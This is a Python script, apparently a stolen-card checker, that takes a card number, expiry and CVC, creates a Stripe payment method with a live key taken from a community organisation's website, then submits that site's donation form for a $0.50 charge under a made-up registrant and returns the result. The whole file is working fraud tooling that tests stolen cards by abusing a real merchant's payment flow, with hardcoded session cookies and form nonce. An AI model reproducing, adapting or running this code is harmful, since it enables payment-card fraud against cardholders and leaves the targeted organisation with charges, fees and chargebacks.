import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F7dc790c2d0%3B+stripe-js-v3%2F7dc790c2d0%3B+card-element&referrer=https%3A%2F%2Fummahsociety.ca&time_on_page=20885&key=pk_live_51OpuMMCN22tCU6j7mPo1L89iIRTKRgD2LuQ8dguK6LZMRSKtZyLTeCcz4Gxsof7yRsFR5y3FmhyWqEfnn0FXOZCE00Bnvj14dJ'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'wp_woocommerce_session_a45056f9f794c70795d2fc08664629ff': 't_a8b6099a220f15b090c71d9e7fffe8%7C%7C1737226500%7C%7C1737222900%7C%7Cb2861af920fbd7bb490365e2566a17fc',
	    '__stripe_mid': '8bafdf34-7ea2-4627-9ed0-f9836acbf6ce1d0c11',
	    '__stripe_sid': 'e519c6c9-5fc0-4e2b-be49-726d44e7e9d54dcf00',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2025-01-16%2018%3A58%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Fummahsociety.ca%2Fsoccer-academy%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_first_add': 'fd%3D2025-01-16%2018%3A58%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Fummahsociety.ca%2Fsoccer-academy%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
	    'sbjs_session': 'pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fummahsociety.ca%2Fsoccer-academy%2F',
	}
	
	headers = {
	    'authority': 'ummahsociety.ca',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'wp_woocommerce_session_a45056f9f794c70795d2fc08664629ff=t_a8b6099a220f15b090c71d9e7fffe8%7C%7C1737226500%7C%7C1737222900%7C%7Cb2861af920fbd7bb490365e2566a17fc; __stripe_mid=8bafdf34-7ea2-4627-9ed0-f9836acbf6ce1d0c11; __stripe_sid=e519c6c9-5fc0-4e2b-be49-726d44e7e9d54dcf00; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-16%2018%3A58%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Fummahsociety.ca%2Fsoccer-academy%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-01-16%2018%3A58%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Fummahsociety.ca%2Fsoccer-academy%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fummahsociety.ca%2Fsoccer-academy%2F',
	    'origin': 'https://ummahsociety.ca',
	    'referer': 'https://ummahsociety.ca/soccer-academy/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1737053926259',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=38514&_fluentform_16_fluentformnonce=ac7dde684e&_wp_http_referer=%2Fsoccer-academy%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser22%40gmail.com&phone=2084359362&repeater_field%5B0%5D%5B%5D=Rodam%20User&repeater_field%5B0%5D%5B%5D=13-14&dropdown_1=Standard%20Package&numeric_field=1&dropdown_2=&numeric_field_1=&custom-payment-amount=0.50&terms-n-condition=on&terms-n-condition_1=on&terms-n-condition_2=on&payment_method=stripe&item__16__fluent_checkme_=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '16',
	}
	
	r2 = requests.post(
	    'https://ummahsociety.ca/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
